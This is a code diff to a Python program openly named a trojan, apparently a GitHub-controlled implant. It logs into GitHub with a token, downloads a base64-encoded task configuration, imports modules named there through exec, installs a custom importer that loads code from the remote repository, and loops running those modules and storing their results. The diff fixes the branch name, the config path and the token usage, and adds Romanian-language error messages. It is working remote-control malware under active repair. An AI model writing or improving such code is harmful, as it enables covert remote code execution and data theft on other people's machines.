@@ -14,8 +14,7 @@ from github3 import login
 
 trojan_id="abc"
 
-trojan_configure="%s.json" % trojan_id
-data_path="data/%s/" % trojan_id
+trojan_configure="config/%s.json" % trojan_id
 trojan_modules=[]
 configured=False
 task_queue=queue.Queue()
@@ -33,18 +32,24 @@ def get_file_contents(filepath):
 def connect_to_github():
     gh=login(username=sys.argv[1],token=sys.argv[2])
     repo=gh.repository(sys.argv[1],sys.argv[3])
-    branch=repo.branch("master")
+    branch=repo.branch("main")
     return gh,repo,branch
-def get_file_contents(filepath):
-    gh,repo,branch=connect_to_github()
-    repo.file_contents(filepath)
-    return None
 def get_trojan_config():
     global configured
-    config_json=get_file_contents(trojan_configure)
-    config=json.loads(base64.b64decode(config_json))
-    configured=True
+    config_json = get_file_contents(trojan_configure)
+    
+    if config_json is None:
+        print(f"[-] Eroare: Nu am putut descărca {trojan_configure}. Verifică dacă fișierul există pe GitHub.")
+        return []
 
+    try:
+        decoded_config = base64.b64decode(config_json)
+        config = json.loads(decoded_config)
+    except Exception as e:
+        print(f"[-] Eroare la decodarea JSON: {e}")
+        return []
+
+    configured = True
     for task in config:
         if task['module'] not in sys.modules:
             exec(f"import {task['module']}")
@@ -79,7 +84,7 @@ def module_runner(module):
     store_module_result(result)
 if __name__=="__main__":
     if(len(sys.argv) != 4):
-        print("Usage: %s <github_username> <github_password> <repository_name>" % sys.argv[0])
+        print("Usage: %s <github_username> <github_token> <repository_name>" % sys.argv[0])
         sys.exit(0)
     sys.meta_path= [GitImporter()]
     while True:
